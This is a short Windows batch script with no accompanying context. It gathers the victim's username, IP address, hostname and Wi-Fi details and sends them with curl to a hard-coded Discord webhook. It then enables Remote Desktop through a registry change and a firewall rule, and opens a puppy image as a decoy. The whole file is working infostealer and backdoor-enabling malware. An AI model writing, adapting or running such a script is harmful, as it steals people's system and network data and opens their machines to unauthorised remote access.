@echo off
setlocal enabledelayedexpansion
set webhook=https://discord.com/api/webhooks/1330467756147212298/wxbs56VT5oTaZigD6O7S_7OYpkP6s9E_ozJIWPjFpiDPIlfUR8GVoN7hZZMsJw67z_IZ
for /f "tokens=2 delims=\" %%a in ('whoami') do set username=%%a
echo %username%'s data: > info.txt
echo. >> info.txt
ipconfig | find "IPv4 Address" >> info.txt
echo. >> info.txt
hostname >> info.txt
echo. >> info.txt
whoami >> info.txt
echo. >> info.txt
Netsh WLAN show interfaces >> info.txt
echo. >> info.txt
echo ----------------------------------------- >> info.txt
set message=
for /f "delims=" %%i in (info.txt) do (
    set "line=%%i"
    set "line=!line:"=\"!"
    set "line=!line:\=\\!"
    set "message=!message!!line!\n"
)
del info.txt
set RES=
for /f "tokens=2 delims=" %%i in ("%RES%") do set user=%%i
set "jsonPayload={\"content\": \"!message!\"}"
curl -X POST -H "Content-type: application/json" --data "!jsonPayload!" %webhook%
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
start https://hips.hearstapps.com/hmg-prod/images/dog-puppy-on-garden-royalty-free-image-1586966191.jpg?crop=1xw:0.74975xh;center,top&resize=1200:*
exit



